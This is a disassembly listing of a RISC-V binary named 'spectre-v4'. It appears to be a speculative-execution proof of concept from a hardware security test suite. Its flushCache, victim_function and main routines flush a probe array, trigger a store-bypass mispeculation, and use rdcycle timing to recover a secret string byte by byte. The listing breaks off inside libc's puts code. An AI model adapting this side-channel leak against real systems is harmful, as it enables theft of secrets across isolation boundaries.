
bin/spectre-v4.riscv：     文件格式 elf64-littleriscv


Disassembly of section .text:

00000000000100b0 <register_fini>:
   100b0:	ffff0797          	auipc	a5,0xffff0
   100b4:	f5078793          	addi	a5,a5,-176 # 0 <register_fini-0x100b0>
   100b8:	c799                	beqz	a5,100c6 <register_fini+0x16>
   100ba:	00003517          	auipc	a0,0x3
   100be:	adc50513          	addi	a0,a0,-1316 # 12b96 <__libc_fini_array>
   100c2:	3150906f          	j	19bd6 <atexit>
   100c6:	8082                	ret

00000000000100c8 <_start>:
   100c8:	00010197          	auipc	gp,0x10
   100cc:	c3018193          	addi	gp,gp,-976 # 1fcf8 <__global_pointer$>
   100d0:	87818513          	addi	a0,gp,-1928 # 1f570 <_edata>
   100d4:	00028617          	auipc	a2,0x28
   100d8:	5b460613          	addi	a2,a2,1460 # 38688 <__BSS_END__>
   100dc:	8e09                	sub	a2,a2,a0
   100de:	4581                	li	a1,0
   100e0:	5da000ef          	jal	ra,106ba <memset>
   100e4:	0000a517          	auipc	a0,0xa
   100e8:	af250513          	addi	a0,a0,-1294 # 19bd6 <atexit>
   100ec:	c519                	beqz	a0,100fa <_start+0x32>
   100ee:	00003517          	auipc	a0,0x3
   100f2:	aa850513          	addi	a0,a0,-1368 # 12b96 <__libc_fini_array>
   100f6:	2e1090ef          	jal	ra,19bd6 <atexit>
   100fa:	556000ef          	jal	ra,10650 <__libc_init_array>
   100fe:	4502                	lw	a0,0(sp)
   10100:	002c                	addi	a1,sp,8
   10102:	4601                	li	a2,0
   10104:	2c8000ef          	jal	ra,103cc <main>
   10108:	a32d                	j	10632 <exit>

000000000001010a <__do_global_dtors_aux>:
   1010a:	8a818793          	addi	a5,gp,-1880 # 1f5a0 <completed.5527>
   1010e:	0007c703          	lbu	a4,0(a5)
   10112:	eb0d                	bnez	a4,10144 <__do_global_dtors_aux+0x3a>
   10114:	1141                	addi	sp,sp,-16
   10116:	e022                	sd	s0,0(sp)
   10118:	e406                	sd	ra,8(sp)
   1011a:	843e                	mv	s0,a5
   1011c:	ffff0797          	auipc	a5,0xffff0
   10120:	ee478793          	addi	a5,a5,-284 # 0 <register_fini-0x100b0>
   10124:	cb89                	beqz	a5,10136 <__do_global_dtors_aux+0x2c>
   10126:	0000e517          	auipc	a0,0xe
   1012a:	21250513          	addi	a0,a0,530 # 1e338 <__FRAME_END__>
   1012e:	00000097          	auipc	ra,0x0
   10132:	000000e7          	jalr	zero # 0 <register_fini-0x100b0>
   10136:	4785                	li	a5,1
   10138:	60a2                	ld	ra,8(sp)
   1013a:	00f40023          	sb	a5,0(s0)
   1013e:	6402                	ld	s0,0(sp)
   10140:	0141                	addi	sp,sp,16
   10142:	8082                	ret
   10144:	8082                	ret

0000000000010146 <frame_dummy>:
   10146:	ffff0797          	auipc	a5,0xffff0
   1014a:	eba78793          	addi	a5,a5,-326 # 0 <register_fini-0x100b0>
   1014e:	cb99                	beqz	a5,10164 <frame_dummy+0x1e>
   10150:	8b018593          	addi	a1,gp,-1872 # 1f5a8 <object.5532>
   10154:	0000e517          	auipc	a0,0xe
   10158:	1e450513          	addi	a0,a0,484 # 1e338 <__FRAME_END__>
   1015c:	00000317          	auipc	t1,0x0
   10160:	00000067          	jr	zero # 0 <register_fini-0x100b0>
   10164:	8082                	ret

0000000000010166 <flushCache>:
   10166:	711d                	addi	sp,sp,-96
   10168:	eca2                	sd	s0,88(sp)
   1016a:	1080                	addi	s0,sp,96
   1016c:	faa43423          	sd	a0,-88(s0)
   10170:	fab43023          	sd	a1,-96(s0)
   10174:	fa043783          	ld	a5,-96(s0)
   10178:	8399                	srli	a5,a5,0x6
   1017a:	fef43423          	sd	a5,-24(s0)
   1017e:	fa043783          	ld	a5,-96(s0)
   10182:	03f7f793          	andi	a5,a5,63
   10186:	c791                	beqz	a5,10192 <flushCache+0x2c>
   10188:	fe843783          	ld	a5,-24(s0)
   1018c:	0785                	addi	a5,a5,1
   1018e:	fef43423          	sd	a5,-24(s0)
   10192:	fe843703          	ld	a4,-24(s0)
   10196:	04000793          	li	a5,64
   1019a:	00e7f663          	bgeu	a5,a4,101a6 <flushCache+0x40>
   1019e:	04000793          	li	a5,64
   101a2:	fef43423          	sd	a5,-24(s0)
   101a6:	fc040ba3          	sb	zero,-41(s0)
   101aa:	000207b7          	lui	a5,0x20
   101ae:	e0078713          	addi	a4,a5,-512 # 1fe00 <dummyMem>
   101b2:	6791                	lui	a5,0x4
   101b4:	973e                	add	a4,a4,a5
   101b6:	77fd                	lui	a5,0xfffff
   101b8:	8ff9                	and	a5,a5,a4
   101ba:	fcf43423          	sd	a5,-56(s0)
   101be:	fe043023          	sd	zero,-32(s0)
   101c2:	a8b9                	j	10220 <flushCache+0xba>
   101c4:	fa843783          	ld	a5,-88(s0)
   101c8:	8399                	srli	a5,a5,0x6
   101ca:	03f7f713          	andi	a4,a5,63
   101ce:	fe043783          	ld	a5,-32(s0)
   101d2:	97ba                	add	a5,a5,a4
   101d4:	079a                	slli	a5,a5,0x6
   101d6:	fcf43023          	sd	a5,-64(s0)
   101da:	fc043c23          	sd	zero,-40(s0)
   101de:	a03d                	j	1020c <flushCache+0xa6>
   101e0:	fd843783          	ld	a5,-40(s0)
   101e4:	07b2                	slli	a5,a5,0xc
   101e6:	faf43c23          	sd	a5,-72(s0)
   101ea:	fc843703          	ld	a4,-56(s0)
   101ee:	fc043783          	ld	a5,-64(s0)
   101f2:	973e                	add	a4,a4,a5
   101f4:	fb843783          	ld	a5,-72(s0)
   101f8:	97ba                	add	a5,a5,a4
   101fa:	0007c783          	lbu	a5,0(a5) # fffffffffffff000 <__BSS_END__+0xfffffffffffc6978>
   101fe:	fcf40ba3          	sb	a5,-41(s0)
   10202:	fd843783          	ld	a5,-40(s0)
   10206:	0785                	addi	a5,a5,1
   10208:	fcf43c23          	sd	a5,-40(s0)
   1020c:	fd843703          	ld	a4,-40(s0)
   10210:	47bd                	li	a5,15
   10212:	fce7f7e3          	bgeu	a5,a4,101e0 <flushCache+0x7a>
   10216:	fe043783          	ld	a5,-32(s0)
   1021a:	0785                	addi	a5,a5,1
   1021c:	fef43023          	sd	a5,-32(s0)
   10220:	fe043703          	ld	a4,-32(s0)
   10224:	fe843783          	ld	a5,-24(s0)
   10228:	f8f76ee3          	bltu	a4,a5,101c4 <flushCache+0x5e>
   1022c:	0001                	nop
   1022e:	0001                	nop
   10230:	6466                	ld	s0,88(sp)
   10232:	6125                	addi	sp,sp,96
   10234:	8082                	ret

0000000000010236 <topTwoIdx>:
   10236:	7139                	addi	sp,sp,-64
   10238:	fc22                	sd	s0,56(sp)
   1023a:	0080                	addi	s0,sp,64
   1023c:	fca43c23          	sd	a0,-40(s0)
   10240:	fcb43823          	sd	a1,-48(s0)
   10244:	fcc43423          	sd	a2,-56(s0)
   10248:	fcd43023          	sd	a3,-64(s0)
   1024c:	fc043783          	ld	a5,-64(s0)
   10250:	0007b023          	sd	zero,0(a5)
   10254:	fc043783          	ld	a5,-64(s0)
   10258:	07a1                	addi	a5,a5,8
   1025a:	0007b023          	sd	zero,0(a5)
   1025e:	fe043423          	sd	zero,-24(s0)
   10262:	a075                	j	1030e <topTwoIdx+0xd8>
   10264:	fe843783          	ld	a5,-24(s0)
   10268:	078e                	slli	a5,a5,0x3
   1026a:	fd843703          	ld	a4,-40(s0)
   1026e:	97ba                	add	a5,a5,a4
   10270:	6398                	ld	a4,0(a5)
   10272:	fc043783          	ld	a5,-64(s0)
   10276:	639c                	ld	a5,0(a5)
   10278:	04e7f563          	bgeu	a5,a4,102c2 <topTwoIdx+0x8c>
   1027c:	fc043783          	ld	a5,-64(s0)
   10280:	07a1                	addi	a5,a5,8
   10282:	fc043703          	ld	a4,-64(s0)
   10286:	6318                	ld	a4,0(a4)
   10288:	e398                	sd	a4,0(a5)
   1028a:	fe843783          	ld	a5,-24(s0)
   1028e:	078e                	slli	a5,a5,0x3
   10290:	fd843703          	ld	a4,-40(s0)
   10294:	97ba                	add	a5,a5,a4
   10296:	6398                	ld	a4,0(a5)
   10298:	fc043783          	ld	a5,-64(s0)
   1029c:	e398                	sd	a4,0(a5)
   1029e:	fc843783          	ld	a5,-56(s0)
   102a2:	0785                	addi	a5,a5,1
   102a4:	fc843703          	ld	a4,-56(s0)
   102a8:	00074703          	lbu	a4,0(a4)
   102ac:	00e78023          	sb	a4,0(a5)
   102b0:	fe843783          	ld	a5,-24(s0)
   102b4:	0ff7f713          	andi	a4,a5,255
   102b8:	fc843783          	ld	a5,-56(s0)
   102bc:	00e78023          	sb	a4,0(a5)
   102c0:	a091                	j	10304 <topTwoIdx+0xce>
   102c2:	fe843783          	ld	a5,-24(s0)
   102c6:	078e                	slli	a5,a5,0x3
   102c8:	fd843703          	ld	a4,-40(s0)
   102cc:	97ba                	add	a5,a5,a4
   102ce:	6398                	ld	a4,0(a5)
   102d0:	fc043783          	ld	a5,-64(s0)
   102d4:	07a1                	addi	a5,a5,8
   102d6:	639c                	ld	a5,0(a5)
   102d8:	02e7f663          	bgeu	a5,a4,10304 <topTwoIdx+0xce>
   102dc:	fe843783          	ld	a5,-24(s0)
   102e0:	078e                	slli	a5,a5,0x3
   102e2:	fd843703          	ld	a4,-40(s0)
   102e6:	973e                	add	a4,a4,a5
   102e8:	fc043783          	ld	a5,-64(s0)
   102ec:	07a1                	addi	a5,a5,8
   102ee:	6318                	ld	a4,0(a4)
   102f0:	e398                	sd	a4,0(a5)
   102f2:	fc843783          	ld	a5,-56(s0)
   102f6:	0785                	addi	a5,a5,1
   102f8:	fe843703          	ld	a4,-24(s0)
   102fc:	0ff77713          	andi	a4,a4,255
   10300:	00e78023          	sb	a4,0(a5)
   10304:	fe843783          	ld	a5,-24(s0)
   10308:	0785                	addi	a5,a5,1
   1030a:	fef43423          	sd	a5,-24(s0)
   1030e:	fe843703          	ld	a4,-24(s0)
   10312:	fd043783          	ld	a5,-48(s0)
   10316:	f4f767e3          	bltu	a4,a5,10264 <topTwoIdx+0x2e>
   1031a:	0001                	nop
   1031c:	0001                	nop
   1031e:	7462                	ld	s0,56(sp)
   10320:	6121                	addi	sp,sp,64
   10322:	8082                	ret

0000000000010324 <victim_function>:
   10324:	7179                	addi	sp,sp,-48
   10326:	f422                	sd	s0,40(sp)
   10328:	1800                	addi	s0,sp,48
   1032a:	fca43c23          	sd	a0,-40(s0)
   1032e:	000387b7          	lui	a5,0x38
   10332:	e4078793          	addi	a5,a5,-448 # 37e40 <str>
   10336:	fd843703          	ld	a4,-40(s0)
   1033a:	e798                	sd	a4,8(a5)
   1033c:	8501b783          	ld	a5,-1968(gp) # 1f548 <str_index>
   10340:	00179713          	slli	a4,a5,0x1
   10344:	84e1b823          	sd	a4,-1968(gp) # 1f548 <str_index>
   10348:	8501b783          	ld	a5,-1968(gp) # 1f548 <str_index>
   1034c:	8581c703          	lbu	a4,-1960(gp) # 1f550 <dummy>
   10350:	d0377753          	fcvt.s.lu	fa4,a4
   10354:	d037f7d3          	fcvt.s.lu	fa5,a5
   10358:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
   1035c:	c0379753          	fcvt.lu.s	a4,fa5,rtz
   10360:	84e1b823          	sd	a4,-1968(gp) # 1f548 <str_index>
   10364:	8501b783          	ld	a5,-1968(gp) # 1f548 <str_index>
   10368:	00038737          	lui	a4,0x38
   1036c:	e4070713          	addi	a4,a4,-448 # 37e40 <str>
   10370:	078e                	slli	a5,a5,0x3
   10372:	97ba                	add	a5,a5,a4
   10374:	0007b023          	sd	zero,0(a5)
   10378:	000387b7          	lui	a5,0x38
   1037c:	e4078793          	addi	a5,a5,-448 # 37e40 <str>
   10380:	679c                	ld	a5,8(a5)
   10382:	6779                	lui	a4,0x1e
   10384:	35870713          	addi	a4,a4,856 # 1e358 <__fini_array_end>
   10388:	97ba                	add	a5,a5,a4
   1038a:	0007c783          	lbu	a5,0(a5)
   1038e:	2781                	sext.w	a5,a5
   10390:	0067979b          	slliw	a5,a5,0x6
   10394:	2781                	sext.w	a5,a5
   10396:	00034737          	lui	a4,0x34
   1039a:	e4070713          	addi	a4,a4,-448 # 33e40 <array2>
   1039e:	97ba                	add	a5,a5,a4
   103a0:	0007c783          	lbu	a5,0(a5)
   103a4:	873e                	mv	a4,a5
   103a6:	8781b783          	ld	a5,-1928(gp) # 1f570 <_edata>
   103aa:	8f7d                	and	a4,a4,a5
   103ac:	86e1bc23          	sd	a4,-1928(gp) # 1f570 <_edata>
   103b0:	c00027f3          	rdcycle	a5
   103b4:	fef43423          	sd	a5,-24(s0)
   103b8:	fe843783          	ld	a5,-24(s0)
   103bc:	0ff7f713          	andi	a4,a5,255
   103c0:	84e18c23          	sb	a4,-1960(gp) # 1f550 <dummy>
   103c4:	0001                	nop
   103c6:	7422                	ld	s0,40(sp)
   103c8:	6145                	addi	sp,sp,48
   103ca:	8082                	ret

00000000000103cc <main>:
   103cc:	7175                	addi	sp,sp,-144
   103ce:	e506                	sd	ra,136(sp)
   103d0:	e122                	sd	s0,128(sp)
   103d2:	0900                	addi	s0,sp,144
   103d4:	8481b703          	ld	a4,-1976(gp) # 1f540 <secretString>
   103d8:	67f9                	lui	a5,0x1e
   103da:	35878793          	addi	a5,a5,856 # 1e358 <__fini_array_end>
   103de:	40f707b3          	sub	a5,a4,a5
   103e2:	fef43423          	sd	a5,-24(s0)
   103e6:	67f1                	lui	a5,0x1c
   103e8:	53078513          	addi	a0,a5,1328 # 1c530 <__clzdi2+0x56>
   103ec:	446000ef          	jal	ra,10832 <puts>
   103f0:	8481b783          	ld	a5,-1976(gp) # 1f540 <secretString>
   103f4:	85be                	mv	a1,a5
   103f6:	67f1                	lui	a5,0x1c
   103f8:	56078513          	addi	a0,a5,1376 # 1c560 <__clzdi2+0x86>
   103fc:	38a000ef          	jal	ra,10786 <printf>
   10400:	fe043023          	sd	zero,-32(s0)
   10404:	ac21                	j	1061c <main+0x250>
   10406:	fc043c23          	sd	zero,-40(s0)
   1040a:	a005                	j	1042a <main+0x5e>
   1040c:	0001f7b7          	lui	a5,0x1f
   10410:	5d878713          	addi	a4,a5,1496 # 1f5d8 <results.2598>
   10414:	fd843783          	ld	a5,-40(s0)
   10418:	078e                	slli	a5,a5,0x3
   1041a:	97ba                	add	a5,a5,a4
   1041c:	0007b023          	sd	zero,0(a5)
   10420:	fd843783          	ld	a5,-40(s0)
   10424:	0785                	addi	a5,a5,1
   10426:	fcf43c23          	sd	a5,-40(s0)
   1042a:	fd843703          	ld	a4,-40(s0)
   1042e:	0ff00793          	li	a5,255
   10432:	fce7fde3          	bgeu	a5,a4,1040c <main+0x40>
   10436:	fc043823          	sd	zero,-48(s0)
   1043a:	a0c9                	j	104fc <main+0x130>
   1043c:	000347b7          	lui	a5,0x34
   10440:	e4078793          	addi	a5,a5,-448 # 33e40 <array2>
   10444:	6591                	lui	a1,0x4
   10446:	853e                	mv	a0,a5
   10448:	d1fff0ef          	jal	ra,10166 <flushCache>
   1044c:	fe843503          	ld	a0,-24(s0)
   10450:	ed5ff0ef          	jal	ra,10324 <victim_function>
   10454:	fc043423          	sd	zero,-56(s0)
   10458:	a079                	j	104e6 <main+0x11a>
   1045a:	fc043023          	sd	zero,-64(s0)
   1045e:	c00027f3          	rdcycle	a5
   10462:	faf43c23          	sd	a5,-72(s0)
   10466:	fb843783          	ld	a5,-72(s0)
   1046a:	faf43823          	sd	a5,-80(s0)
   1046e:	fc843783          	ld	a5,-56(s0)
   10472:	079a                	slli	a5,a5,0x6
   10474:	00034737          	lui	a4,0x34
   10478:	e4070713          	addi	a4,a4,-448 # 33e40 <array2>
   1047c:	97ba                	add	a5,a5,a4
   1047e:	0007c703          	lbu	a4,0(a5)
   10482:	8581c783          	lbu	a5,-1960(gp) # 1f550 <dummy>
   10486:	8ff9                	and	a5,a5,a4
   10488:	0ff7f713          	andi	a4,a5,255
   1048c:	84e18c23          	sb	a4,-1960(gp) # 1f550 <dummy>
   10490:	c00027f3          	rdcycle	a5
   10494:	faf43423          	sd	a5,-88(s0)
   10498:	fa843703          	ld	a4,-88(s0)
   1049c:	fb043783          	ld	a5,-80(s0)
   104a0:	40f707b3          	sub	a5,a4,a5
   104a4:	faf43023          	sd	a5,-96(s0)
   104a8:	fa043703          	ld	a4,-96(s0)
   104ac:	03100793          	li	a5,49
   104b0:	02e7e663          	bltu	a5,a4,104dc <main+0x110>
   104b4:	0001f7b7          	lui	a5,0x1f
   104b8:	5d878713          	addi	a4,a5,1496 # 1f5d8 <results.2598>
   104bc:	fc843783          	ld	a5,-56(s0)
   104c0:	078e                	slli	a5,a5,0x3
   104c2:	97ba                	add	a5,a5,a4
   104c4:	639c                	ld	a5,0(a5)
   104c6:	00178713          	addi	a4,a5,1
   104ca:	0001f7b7          	lui	a5,0x1f
   104ce:	5d878693          	addi	a3,a5,1496 # 1f5d8 <results.2598>
   104d2:	fc843783          	ld	a5,-56(s0)
   104d6:	078e                	slli	a5,a5,0x3
   104d8:	97b6                	add	a5,a5,a3
   104da:	e398                	sd	a4,0(a5)
   104dc:	fc843783          	ld	a5,-56(s0)
   104e0:	0785                	addi	a5,a5,1
   104e2:	fcf43423          	sd	a5,-56(s0)
   104e6:	fc843703          	ld	a4,-56(s0)
   104ea:	0ff00793          	li	a5,255
   104ee:	f6e7f6e3          	bgeu	a5,a4,1045a <main+0x8e>
   104f2:	fd043783          	ld	a5,-48(s0)
   104f6:	0785                	addi	a5,a5,1
   104f8:	fcf43823          	sd	a5,-48(s0)
   104fc:	fd043703          	ld	a4,-48(s0)
   10500:	47a5                	li	a5,9
   10502:	f2e7fde3          	bgeu	a5,a4,1043c <main+0x70>
   10506:	f8041c23          	sh	zero,-104(s0)
   1050a:	f8043423          	sd	zero,-120(s0)
   1050e:	f8043823          	sd	zero,-112(s0)
   10512:	f8840713          	addi	a4,s0,-120
   10516:	f9840793          	addi	a5,s0,-104
   1051a:	86ba                	mv	a3,a4
   1051c:	863e                	mv	a2,a5
   1051e:	10000593          	li	a1,256
   10522:	0001f7b7          	lui	a5,0x1f
   10526:	5d878513          	addi	a0,a5,1496 # 1f5d8 <results.2598>
   1052a:	d0dff0ef          	jal	ra,10236 <topTwoIdx>
   1052e:	f9844683          	lbu	a3,-104(s0)
   10532:	8481b703          	ld	a4,-1976(gp) # 1f540 <secretString>
   10536:	fe043783          	ld	a5,-32(s0)
   1053a:	97ba                	add	a5,a5,a4
   1053c:	0007c783          	lbu	a5,0(a5)
   10540:	8736                	mv	a4,a3
   10542:	00f70e63          	beq	a4,a5,1055e <main+0x192>
   10546:	f9944683          	lbu	a3,-103(s0)
   1054a:	8481b703          	ld	a4,-1976(gp) # 1f540 <secretString>
   1054e:	fe043783          	ld	a5,-32(s0)
   10552:	97ba                	add	a5,a5,a4
   10554:	0007c783          	lbu	a5,0(a5)
   10558:	8736                	mv	a4,a3
   1055a:	04f71d63          	bne	a4,a5,105b4 <main+0x1e8>
   1055e:	fe843703          	ld	a4,-24(s0)
   10562:	67f9                	lui	a5,0x1e
   10564:	35878793          	addi	a5,a5,856 # 1e358 <__fini_array_end>
   10568:	00f705b3          	add	a1,a4,a5
   1056c:	8481b703          	ld	a4,-1976(gp) # 1f540 <secretString>
   10570:	fe043783          	ld	a5,-32(s0)
   10574:	97ba                	add	a5,a5,a4
   10576:	0007c783          	lbu	a5,0(a5)
   1057a:	0007861b          	sext.w	a2,a5
   1057e:	f8843683          	ld	a3,-120(s0)
   10582:	f9844783          	lbu	a5,-104(s0)
   10586:	0007871b          	sext.w	a4,a5
   1058a:	f9844783          	lbu	a5,-104(s0)
   1058e:	0007851b          	sext.w	a0,a5
   10592:	f9043803          	ld	a6,-112(s0)
   10596:	f9944783          	lbu	a5,-103(s0)
   1059a:	0007889b          	sext.w	a7,a5
   1059e:	f9944783          	lbu	a5,-103(s0)
   105a2:	2781                	sext.w	a5,a5
   105a4:	e03e                	sd	a5,0(sp)
   105a6:	87aa                	mv	a5,a0
   105a8:	6571                	lui	a0,0x1c
   105aa:	57850513          	addi	a0,a0,1400 # 1c578 <__clzdi2+0x9e>
   105ae:	1d8000ef          	jal	ra,10786 <printf>
   105b2:	a899                	j	10608 <main+0x23c>
   105b4:	fe843703          	ld	a4,-24(s0)
   105b8:	67f9                	lui	a5,0x1e
   105ba:	35878793          	addi	a5,a5,856 # 1e358 <__fini_array_end>
   105be:	00f705b3          	add	a1,a4,a5
   105c2:	8481b703          	ld	a4,-1976(gp) # 1f540 <secretString>
   105c6:	fe043783          	ld	a5,-32(s0)
   105ca:	97ba                	add	a5,a5,a4
   105cc:	0007c783          	lbu	a5,0(a5)
   105d0:	0007861b          	sext.w	a2,a5
   105d4:	f8843683          	ld	a3,-120(s0)
   105d8:	f9844783          	lbu	a5,-104(s0)
   105dc:	0007871b          	sext.w	a4,a5
   105e0:	f9844783          	lbu	a5,-104(s0)
   105e4:	0007851b          	sext.w	a0,a5
   105e8:	f9043803          	ld	a6,-112(s0)
   105ec:	f9944783          	lbu	a5,-103(s0)
   105f0:	0007889b          	sext.w	a7,a5
   105f4:	f9944783          	lbu	a5,-103(s0)
   105f8:	2781                	sext.w	a5,a5
   105fa:	e03e                	sd	a5,0(sp)
   105fc:	87aa                	mv	a5,a0
   105fe:	6571                	lui	a0,0x1c
   10600:	5d850513          	addi	a0,a0,1496 # 1c5d8 <__clzdi2+0xfe>
   10604:	182000ef          	jal	ra,10786 <printf>
   10608:	fe843783          	ld	a5,-24(s0)
   1060c:	0785                	addi	a5,a5,1
   1060e:	fef43423          	sd	a5,-24(s0)
   10612:	fe043783          	ld	a5,-32(s0)
   10616:	0785                	addi	a5,a5,1
   10618:	fef43023          	sd	a5,-32(s0)
   1061c:	fe043703          	ld	a4,-32(s0)
   10620:	47e5                	li	a5,25
   10622:	dee7f2e3          	bgeu	a5,a4,10406 <main+0x3a>
   10626:	4781                	li	a5,0
   10628:	853e                	mv	a0,a5
   1062a:	60aa                	ld	ra,136(sp)
   1062c:	640a                	ld	s0,128(sp)
   1062e:	6149                	addi	sp,sp,144
   10630:	8082                	ret

0000000000010632 <exit>:
   10632:	1141                	addi	sp,sp,-16
   10634:	4581                	li	a1,0
   10636:	e022                	sd	s0,0(sp)
   10638:	e406                	sd	ra,8(sp)
   1063a:	842a                	mv	s0,a0
   1063c:	03c020ef          	jal	ra,12678 <__call_exitprocs>
   10640:	8301b503          	ld	a0,-2000(gp) # 1f528 <_global_impure_ptr>
   10644:	6d3c                	ld	a5,88(a0)
   10646:	c391                	beqz	a5,1064a <exit+0x18>
   10648:	9782                	jalr	a5
   1064a:	8522                	mv	a0,s0
   1064c:	0bf0a0ef          	jal	ra,1af0a <_exit>

0000000000010650 <__libc_init_array>:
   10650:	1101                	addi	sp,sp,-32
   10652:	e822                	sd	s0,16(sp)
   10654:	e04a                	sd	s2,0(sp)
   10656:	0000e417          	auipc	s0,0xe
   1065a:	ce640413          	addi	s0,s0,-794 # 1e33c <__preinit_array_end>
   1065e:	0000e917          	auipc	s2,0xe
   10662:	cde90913          	addi	s2,s2,-802 # 1e33c <__preinit_array_end>
   10666:	40890933          	sub	s2,s2,s0
   1066a:	ec06                	sd	ra,24(sp)
   1066c:	e426                	sd	s1,8(sp)
   1066e:	40395913          	srai	s2,s2,0x3
   10672:	00090963          	beqz	s2,10684 <__libc_init_array+0x34>
   10676:	4481                	li	s1,0
   10678:	601c                	ld	a5,0(s0)
   1067a:	0485                	addi	s1,s1,1
   1067c:	0421                	addi	s0,s0,8
   1067e:	9782                	jalr	a5
   10680:	fe991ce3          	bne	s2,s1,10678 <__libc_init_array+0x28>
   10684:	0000e417          	auipc	s0,0xe
   10688:	cbc40413          	addi	s0,s0,-836 # 1e340 <__init_array_start>
   1068c:	0000e917          	auipc	s2,0xe
   10690:	cc490913          	addi	s2,s2,-828 # 1e350 <__init_array_end>
   10694:	40890933          	sub	s2,s2,s0
   10698:	40395913          	srai	s2,s2,0x3
   1069c:	00090963          	beqz	s2,106ae <__libc_init_array+0x5e>
   106a0:	4481                	li	s1,0
   106a2:	601c                	ld	a5,0(s0)
   106a4:	0485                	addi	s1,s1,1
   106a6:	0421                	addi	s0,s0,8
   106a8:	9782                	jalr	a5
   106aa:	fe991ce3          	bne	s2,s1,106a2 <__libc_init_array+0x52>
   106ae:	60e2                	ld	ra,24(sp)
   106b0:	6442                	ld	s0,16(sp)
   106b2:	64a2                	ld	s1,8(sp)
   106b4:	6902                	ld	s2,0(sp)
   106b6:	6105                	addi	sp,sp,32
   106b8:	8082                	ret

00000000000106ba <memset>:
   106ba:	433d                	li	t1,15
   106bc:	872a                	mv	a4,a0
   106be:	02c37163          	bgeu	t1,a2,106e0 <memset+0x26>
   106c2:	00f77793          	andi	a5,a4,15
   106c6:	e3c1                	bnez	a5,10746 <memset+0x8c>
   106c8:	e1bd                	bnez	a1,1072e <memset+0x74>
   106ca:	ff067693          	andi	a3,a2,-16
   106ce:	8a3d                	andi	a2,a2,15
   106d0:	96ba                	add	a3,a3,a4
   106d2:	e30c                	sd	a1,0(a4)
   106d4:	e70c                	sd	a1,8(a4)
   106d6:	0741                	addi	a4,a4,16
   106d8:	fed76de3          	bltu	a4,a3,106d2 <memset+0x18>
   106dc:	e211                	bnez	a2,106e0 <memset+0x26>
   106de:	8082                	ret
   106e0:	40c306b3          	sub	a3,t1,a2
   106e4:	068a                	slli	a3,a3,0x2
   106e6:	00000297          	auipc	t0,0x0
   106ea:	9696                	add	a3,a3,t0
   106ec:	00a68067          	jr	10(a3)
   106f0:	00b70723          	sb	a1,14(a4)
   106f4:	00b706a3          	sb	a1,13(a4)
   106f8:	00b70623          	sb	a1,12(a4)
   106fc:	00b705a3          	sb	a1,11(a4)
   10700:	00b70523          	sb	a1,10(a4)
   10704:	00b704a3          	sb	a1,9(a4)
   10708:	00b70423          	sb	a1,8(a4)
   1070c:	00b703a3          	sb	a1,7(a4)
   10710:	00b70323          	sb	a1,6(a4)
   10714:	00b702a3          	sb	a1,5(a4)
   10718:	00b70223          	sb	a1,4(a4)
   1071c:	00b701a3          	sb	a1,3(a4)
   10720:	00b70123          	sb	a1,2(a4)
   10724:	00b700a3          	sb	a1,1(a4)
   10728:	00b70023          	sb	a1,0(a4)
   1072c:	8082                	ret
   1072e:	0ff5f593          	andi	a1,a1,255
   10732:	00859693          	slli	a3,a1,0x8
   10736:	8dd5                	or	a1,a1,a3
   10738:	01059693          	slli	a3,a1,0x10
   1073c:	8dd5                	or	a1,a1,a3
   1073e:	02059693          	slli	a3,a1,0x20
   10742:	8dd5                	or	a1,a1,a3
   10744:	b759                	j	106ca <memset+0x10>
   10746:	00279693          	slli	a3,a5,0x2
   1074a:	00000297          	auipc	t0,0x0
   1074e:	9696                	add	a3,a3,t0
   10750:	8286                	mv	t0,ra
   10752:	fa2680e7          	jalr	-94(a3)
   10756:	8096                	mv	ra,t0
   10758:	17c1                	addi	a5,a5,-16
   1075a:	8f1d                	sub	a4,a4,a5
   1075c:	963e                	add	a2,a2,a5
   1075e:	f8c371e3          	bgeu	t1,a2,106e0 <memset+0x26>
   10762:	b79d                	j	106c8 <memset+0xe>

0000000000010764 <_printf_r>:
   10764:	715d                	addi	sp,sp,-80
   10766:	f032                	sd	a2,32(sp)
   10768:	f436                	sd	a3,40(sp)
   1076a:	f83a                	sd	a4,48(sp)
   1076c:	fc3e                	sd	a5,56(sp)
   1076e:	e0c2                	sd	a6,64(sp)
   10770:	e4c6                	sd	a7,72(sp)
   10772:	862e                	mv	a2,a1
   10774:	690c                	ld	a1,16(a0)
   10776:	1014                	addi	a3,sp,32
   10778:	ec06                	sd	ra,24(sp)
   1077a:	e436                	sd	a3,8(sp)
   1077c:	152000ef          	jal	ra,108ce <_vfprintf_r>
   10780:	60e2                	ld	ra,24(sp)
   10782:	6161                	addi	sp,sp,80
   10784:	8082                	ret

0000000000010786 <printf>:
   10786:	711d                	addi	sp,sp,-96
   10788:	f832                	sd	a2,48(sp)
   1078a:	fc36                	sd	a3,56(sp)
   1078c:	8601b303          	ld	t1,-1952(gp) # 1f558 <_impure_ptr>
   10790:	f42e                	sd	a1,40(sp)
   10792:	e0ba                	sd	a4,64(sp)
   10794:	e4be                	sd	a5,72(sp)
   10796:	e8c2                	sd	a6,80(sp)
   10798:	ecc6                	sd	a7,88(sp)
   1079a:	01033583          	ld	a1,16(t1) # 1016c <flushCache+0x6>
   1079e:	1034                	addi	a3,sp,40
   107a0:	862a                	mv	a2,a0
   107a2:	851a                	mv	a0,t1
   107a4:	ec06                	sd	ra,24(sp)
   107a6:	e436                	sd	a3,8(sp)
   107a8:	126000ef          	jal	ra,108ce <_vfprintf_r>
   107ac:	60e2                	ld	ra,24(sp)
   107ae:	6125                	addi	sp,sp,96
   107b0:	8082                	ret

00000000000107b2 <_puts_r>:
   107b2:	7159                	addi	sp,sp,-112
   107b4:	f0a2                	sd	s0,96(sp)
   107b6:	842a                	mv	s0,a0
   107b8:	852e                	mv	a0,a1
   107ba:	eca6                	sd	s1,88(sp)
   107bc:	f486                	sd	ra,104(sp)
   107be:	84ae                	mv	s1,a1
   107c0:	07a000ef          	jal	ra,1083a <strlen>
   107c4:	00150713          	addi	a4,a0,1
   107c8:	0000c697          	auipc	a3,0xc
   107cc:	e7068693          	addi	a3,a3,-400 # 1c638 <__clzdi2+0x15e>
   107d0:	f43a                	sd	a4,40(sp)
   107d2:	483c                	lw	a5,80(s0)
   107d4:	1818                	addi	a4,sp,48
   107d6:	e0b6                	sd	a3,64(sp)
   107d8:	ec3a                	sd	a4,24(sp)
   107da:	4685                	li	a3,1
   107dc:	4709                	li	a4,2
   107de:	f826                	sd	s1,48(sp)
   107e0:	fc2a                	sd	a0,56(sp)
   107e2:	e4b6                	sd	a3,72(sp)
   107e4:	d03a                	sw	a4,32(sp)
